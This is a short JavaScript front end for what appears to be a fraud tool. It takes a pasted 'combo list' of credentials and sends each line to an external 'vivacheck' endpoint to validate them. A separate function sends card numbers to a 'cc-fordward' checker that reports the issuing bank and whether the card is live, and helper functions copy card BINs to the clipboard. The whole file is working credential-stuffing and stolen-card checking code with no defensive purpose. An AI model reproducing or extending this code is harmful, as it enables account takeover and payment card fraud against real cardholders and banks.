
document.addEventListener('DOMContentLoaded', function () {

    var checkBtn = document.getElementById("checkBtn");
    checkBtn.addEventListener('click', async function () {
        const comboList = document.getElementById('comboList').value;
        const credentials = comboList.split('\n');

        const requests = credentials.map(cred => axios.get(`https://viva-216j.onrender.com/vivacheck?creds=${encodeURIComponent(cred)}`));

        try {
            const responses = await Promise.all(requests);
            // Handle the responses
            responses.forEach(response => {
                console.log(response.data);
            });
        } catch (error) {
            // Handle any errors
            console.error(error);
        }
    });

});

function isLive(kardo) {
    return axios.get(`https://cc-fordward.onrender.com/check?cc=${kardo}`).then((res) => {
        return { bankNAme: res.data.bankName, status: res.data.status };
    })
}

function showToast(checkDigit) {
    const toast = document.getElementById('toast');
    toast.style.display = 'block';
    toast.style.opacity = 1;
    toast.style.bottom = '40px';
    toast.style.zIndex = 9999;
    toast.textContent = "Copied to clipboard! " + checkDigit;

    setTimeout(() => {
        toast.style.opacity = 0;
        toast.style.bottom = '20px';
        setTimeout(() => {
            toast.style.display = 'none';
        }, 500);
    }, 2000);
}

function copyToClipboard(bin) {
    let copyBin = bin.split('|')[0];
    navigator.clipboard.writeText(copyBin).then(() => {
        showToast(copyBin);
    }).catch(err => {
        console.error('Error in copying text: ', err);
    });
}
